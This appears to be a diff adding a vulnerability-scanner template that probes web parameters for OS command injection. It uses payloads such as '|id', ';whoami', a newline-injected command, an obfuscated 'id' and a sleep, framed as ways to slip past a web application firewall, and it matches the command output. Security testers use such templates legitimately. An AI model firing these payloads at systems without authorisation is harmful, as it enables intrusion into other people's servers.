@@ -1,0 +1,46 @@
+id: advanced-rce-waf-bypass
+
+info:
+  name: Advanced Command Injection (RCE) with WAF Evasion
+  author: thenawabx
+  severity: critical
+  description: Targeted at bypassing OS command filters using shell metacharacters and encoding.
+  tags: rce, advanced, waf-bypass, os-command
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd={{payload}}"
+      - "{{BaseURL}}/?exec={{payload}}"
+      - "{{BaseURL}}/?query={{payload}}"
+      - "{{BaseURL}}/?file={{payload}}"
+
+    payloads:
+      payload:
+        # 1. Basic Pipe Bypass
+        - "|id"
+        # 2. Semicolon & Space Bypass (Using ${IFS} for spaces)
+        - ";whoami"
+        # 3. Newline Injection Bypass
+        - "%0awhoami"
+        # 4. Obfuscated Command (Bypasses keyword detection for 'id')
+        - "';i'd''"
+        # 5. Logical AND Bypass with Sleep (To confirm execution)
+        - "&&sleep${IFS}5"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Matches typical output of 'id' or 'whoami' commands
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+          - "root|www-data|apache|daemon"
+        condition: or
+
+      # Ensures successful 200 OK status
+      - type: status
+        status:
+          - 200
